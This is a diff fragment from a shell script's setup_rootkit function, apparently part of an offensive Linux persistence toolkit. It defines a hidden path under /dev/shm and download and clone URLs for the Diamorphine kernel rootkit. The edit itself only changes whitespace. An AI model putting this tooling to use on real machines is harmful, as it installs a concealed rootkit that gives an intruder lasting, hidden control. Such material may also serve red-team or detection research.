@@ -5,7 +5,7 @@ setup_rootkit() {
     # Inspiration: https://github.com/Trevohack/DynastyPersist/blob/main/src/dynasty.sh#L194
 
     local rk_path="/dev/shm/.rk"
-	local tmp_path="/tmp"
+    local tmp_path="/tmp"
     local zip_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.zip"
     local tar_url="https://github.com/Aegrah/Diamorphine/releases/download/v1.0.0/diamorphine.tar"
     local clone_url="https://github.com/Aegrah/Diamorphine.git"
